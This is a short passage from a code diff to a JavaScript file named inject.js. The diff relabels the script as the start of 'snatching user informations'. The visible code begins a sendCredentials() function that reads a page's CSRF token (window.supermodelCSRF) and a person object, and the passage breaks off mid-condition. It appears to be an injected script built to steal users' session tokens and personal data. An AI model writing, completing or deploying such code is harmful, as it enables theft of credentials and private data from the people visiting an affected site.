@@ -1,6 +1,5 @@
-// inject.js
+// starting point of the application: snatching user informations. 
 (function() {
-  // Wait until those globals are defined
   function sendCredentials() {
     if (typeof window.supermodelCSRF === 'string'
         && window.person
